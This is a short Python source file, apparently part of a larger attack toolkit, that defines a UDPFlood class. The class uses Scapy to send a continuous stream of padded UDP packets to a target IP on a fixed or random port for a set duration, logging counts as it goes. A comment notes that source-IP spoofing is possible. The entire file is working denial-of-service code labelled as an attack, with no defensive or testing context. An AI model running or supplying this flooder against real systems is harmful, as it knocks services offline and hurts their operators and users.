import logging
import random
import time
from scapy.all import IP, UDP, send, Raw

class UDPFlood:
    """
    Layer 3/4 Volumetric: UDP Flood attack.
    Uses Scapy for packet crafting.
    """
    def __init__(self, target_ip: str, target_port: int = None):
        self.target_ip = target_ip
        self.target_port = target_port
        self.logger = logging.getLogger("UDPFlood")
        self.is_running = False

    def start(self, duration: int, packet_size: int = 1024):
        self.logger.info(f"[*] Starting UDP Flood on {self.target_ip} for {duration}s...")
        self.is_running = True
        end_time = time.time() + duration
        packets_sent = 0
        
        payload = Raw(load="X" * packet_size)
        
        try:
            while self.is_running and time.time() < end_time:
                port = self.target_port if self.target_port else random.randint(1, 65535)
                # Spoofing source IP is possible but might be blocked by local ISP
                packet = IP(dst=self.target_ip) / UDP(dport=port) / payload
                send(packet, verbose=False)
                packets_sent += 1
                if packets_sent % 1000 == 0:
                    self.logger.info(f"[UDP Flood] Packets sent: {packets_sent}")
        except Exception as e:
            self.logger.error(f"[-] UDP Flood error: {e}")
        finally:
            self.is_running = False
            self.logger.info(f"[+] UDP Flood finished. Total packets: {packets_sent}")

    def stop(self):
        self.is_running = False
